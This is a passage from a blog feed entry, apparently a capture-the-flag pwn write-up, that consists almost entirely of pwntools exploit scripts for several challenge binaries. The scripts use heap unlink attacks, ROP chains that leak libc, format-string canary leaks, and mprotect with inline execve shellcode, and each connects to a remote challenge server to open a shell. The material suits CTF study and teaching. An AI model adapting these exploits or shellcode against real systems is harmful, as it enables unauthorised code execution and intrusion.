choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Length of note:'</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Content of note:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'aa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'bb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#2</span></span><br><span class="line">chunk0_addr=<span class="number">0x006020C0</span></span><br><span class="line">admin=<span class="number">0x602088</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(admin)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),p64(<span class="number">0x7E4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'2019'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="正定">正定</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn14')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50014</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Size of note : "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Content of note:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">"Size of note : "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Content of note : '</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'aa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'bb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'dd'</span>)<span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'ee'</span>)<span class="comment">#4</span></span><br><span class="line">chunk0_addr=<span class="number">0x4040C0</span></span><br><span class="line">admin=<span class="number">0x4040A0</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(admin)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),p64(<span class="number">0x7E4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'70'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="一苇">一苇</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./pwn13')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>,<span class="number">50013</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'\x50'</span></span><br><span class="line">p.sendafter(<span class="string">"input massage\n"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="拈花">拈花</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process("./pwn11")</span></span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="number">50011</span>)</span><br><span class="line">libc=ELF(<span class="string">"libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"please input your name\n"</span>,<span class="string">"A"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn11"</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x4012ab</span></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">40</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(<span class="number">0x401080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"ail!\n"</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.sendlineafter(<span class="string">"please input your name\n"</span>,<span class="string">"A"</span>)</span><br><span class="line">system_addr=libc.symbols[<span class="string">"system"</span>]+libc_base</span><br><span class="line">bin_sh=libc_base+next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">payload=<span class="string">'B'</span>*<span class="number">40</span></span><br><span class="line">payload+=p64(<span class="number">0x4012A2</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(elf.got[<span class="string">"read"</span>])</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401288</span>)</span><br><span class="line">payload+=<span class="string">'B'</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="坐忘">坐忘</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#p=process("./pwn9")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="string">"50009"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn9"</span>)</span><br><span class="line">mprotect=elf.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">9</span></span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.recvuntil(<span class="string">"welcome to base64 decode server\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"decode res:\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))<span class="number">-0x41</span></span><br><span class="line">success(<span class="string">"canary =====&gt; 0x%x"</span>%canary)</span><br><span class="line">int_0x80=<span class="number">0x4bc587</span></span><br><span class="line">poprdi=<span class="number">0x401e36</span></span><br><span class="line">poprsi=<span class="number">0x401f57</span></span><br><span class="line">poprdx=<span class="number">0x4433e6</span></span><br><span class="line">start_addr=<span class="number">0x400890</span></span><br><span class="line">p.recvuntil(<span class="string">"continue ?"</span>)</span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_addr=elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">8</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(bss_addr&amp;<span class="number">0xfffffffffffff000</span>)</span><br><span class="line">payload+=p64(poprsi)</span><br><span class="line">payload+=p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+=p64(poprdx)</span><br><span class="line">payload+=p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect)</span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(poprsi)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(poprdx)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(read_addr)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;\n"</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">"continue ?"</span>,<span class="string">"no"</span>)</span><br><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="玄冥">玄冥</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>,<span class="number">50007</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size:"</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice &gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">chunk0_addr=<span class="number">0x006020E0</span></span><br><span class="line">target=<span class="number">0x0602020</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload=p64(target)+p64(target)+p64(target)+p64(target)+p64(target<span class="number">-0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your data:'</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'free_addr====&gt;0x%x'</span>%free_addr)</span><br><span class="line">libc_base=free_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base====&gt;0x%x'</span>%libc_base)</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">1</span>,len(p64(system_addr))+<span class="number">1</span>,p64(system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">9</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="於讴">於讴</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50006</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">main_addr=<span class="number">0x04007C3</span></span><br><span class="line">put_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">start_got=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">poprdi=<span class="number">0x414fc3</span></span><br><span class="line">start_libc=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OH, WHY ARE YOU SO GOOD?\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(poprdi)+p64(start_got)+p64(put_plt) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">start_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(start_addr)</span><br><span class="line">libc_base = start_addr - start_libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">bin_sh=<span class="number">0x1633e8</span></span><br><span class="line">system=libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_addr=bin_sh+libc_base</span><br><span class="line">system_addr=system+libc_base</span><br><span class="line"><span class="keyword">print</span> hex(bin_addr)</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OH, WHY ARE YOU SO GOOD?\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(poprdi)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="副墨">副墨</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./bf")</span></span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="number">50001</span>)</span><br><span class="line">elf=ELF(<span class="string">"./bf"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Are you sure want to play the game?\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload=<span class="string">'%17$p%26$p'</span></span><br><span class="line">payload=payload.ljust(<span class="number">28</span>,<span class="string">'A'</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">"Input your name : \n"</span>,payload)</span><br><span class="line"></span><br><span class="line">array=[<span class="number">7427</span> , <span class="number">39356</span>  ,<span class="number">9595</span>  ,<span class="number">54062</span>  ,<span class="number">67371</span> , <span class="number">42578</span>  ,<span class="number">92585</span>  ,<span class="number">76990</span>  ,<span class="number">22615</span>  ,<span class="number">53318</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">    p.recvuntil(<span class="string">"Now guess:"</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Correct!\n"</span>)</span><br><span class="line">canary=eval(p.recv(<span class="number">18</span>))</span><br><span class="line">success(<span class="string">"canary ==&gt; 0x%x"</span>%canary)</span><br><span class="line">base_addr=eval(p.recv(<span class="number">14</span>))<span class="number">-0x970</span></span><br><span class="line">success(<span class="string">"base_addr ==&gt; 0x%x"</span>%base_addr)</span><br><span class="line">pop_rdi_ret=<span class="number">0xdb3</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">52</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(base_addr+<span class="number">0x970</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">"Are you sure want to play the game?\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload=<span class="string">'%19$p'</span></span><br><span class="line">payload=payload.ljust(<span class="number">28</span>,<span class="string">'A'</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">"Input your name : \n"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">    p.recvuntil(<span class="string">"Now guess:"</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Correct!\n"</span>)</span><br><span class="line">libc_start_main=eval(p.recv(<span class="number">14</span>))<span class="number">-240</span></span><br><span class="line">success(<span class="string">"libc_start_main ==&gt; 0x%x"</span>%libc_start_main)</span><br><span class="line"></span><br><span class="line">system_addr=base_addr+elf.plt[<span class="string">"system"</span>]</span><br><span class="line">foot=base_addr+<span class="number">0xDAA</span></span><br><span class="line">init=base_addr+<span class="number">0xD90</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]+base_addr</span><br><span class="line">puts_got=elf.got[<span class="string">"read"</span>]+base_addr</span><br><span class="line">read_plt=elf.plt[<span class="string">"read"</span>]+base_addr</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">52</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(foot)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(elf.bss()+base_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(init)</span><br><span class="line">payload+=<span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss()+base_addr)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;立雪&quot;&gt;立雪&lt;/span&gt;&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="unlink" scheme="http://Whali3n51.top/tags/unlink/"/>
    
      <category term="stack_overflow" scheme="http://Whali3n51.top/tags/stack-overflow/"/>
    
  </entry>
  
</feed>
